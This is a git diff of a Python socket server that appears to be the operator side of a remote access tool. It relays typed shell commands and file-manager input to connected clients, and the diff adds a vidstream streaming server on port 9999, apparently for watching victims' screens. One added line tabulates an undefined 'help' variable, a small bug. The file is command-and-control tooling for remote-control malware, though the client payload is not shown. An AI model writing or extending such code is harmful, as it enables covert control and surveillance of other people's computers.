@@ -2,10 +2,12 @@ import socket
 import threading
 from colorama import Fore
 import colorama,platform,os
-import ast
+import ast,time
 from tabulate import tabulate
 from pprint import pprint
 colorama.init()
+from vidstream import StreamingServer
+
 
 green,reset  =  Fore.GREEN,Fore.RESET 
 HEADER       =  2048 
@@ -17,6 +19,8 @@ FORMAT       =  'utf-8'
 
 server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 server.bind(ADDR)
+
+streaming_server = StreamingServer(SERVER,9999)
 
 
 
@@ -38,7 +42,8 @@ def handle_clinet(conn,addr):
             msg     = conn.recv(msg_len).decode(FORMAT)
             if msg.split("--")[1] == "waiting_for_response" and msg.split("--")[0] == "resp":
                 send(conn,input("cmd: ").strip())
-            
+            if msg.split("--")[1] == "waiting_for_response" and msg.split("--")[0] == "y_n":
+                send(conn,input(Fore.CYAN+"[Question [y,n] ] "))
             else:
                 #print(f"[NEW MESSAGE] {addr} || {msg}")
                 try:
@@ -46,6 +51,12 @@ def handle_clinet(conn,addr):
                         data = ast.literal_eval(msg.split("--")[1])
                         table = tabulate(data, headers=["Name", "Type"], tablefmt="fancy_grid")
                         print(table)
+
+                    if str(msg.split("--")[0]) == "help_list":
+                        data = ast.literal_eval(msg.split("--")[1])
+                        help_table = tabulate(help, headers=["command", "description"], tablefmt="fancy_grid")
+                        print(help_table)
+                        input("anything to countinue")
                     elif str(msg.split("--")[0]) == "file_manager":
                         send(conn,input(f"\n\n{Fore.RESET}[{Fore.RED}!{Fore.RESET}] Filemanager: "))
                     
@@ -56,6 +67,12 @@ def handle_clinet(conn,addr):
                     elif str(msg.split("--")[0]) == "war":
                         msg = str(msg).split("--")[1]
                         print(f"{Fore.YELLOW}[WARNING] {msg}")
+                    
+                    elif str(msg.split("--")[0]) == "conf":
+                        msg = str(msg).split("--")[1]
+                        print(f"{Fore.GREEN}[CONFIRMATION] {msg}")
+                        time.sleep(2)
+
                 except:
                     pass 
 
@@ -82,7 +99,14 @@ def start():
         thread.start()
         print(get_active_connections())
     
+def streaming():
+    streaming_server.start_server()
 
+def stopstreaming():
+    streaming_server.stop_server()
+
+t = threading.Thread(target=streaming)
+t.start()
 
 start()
 
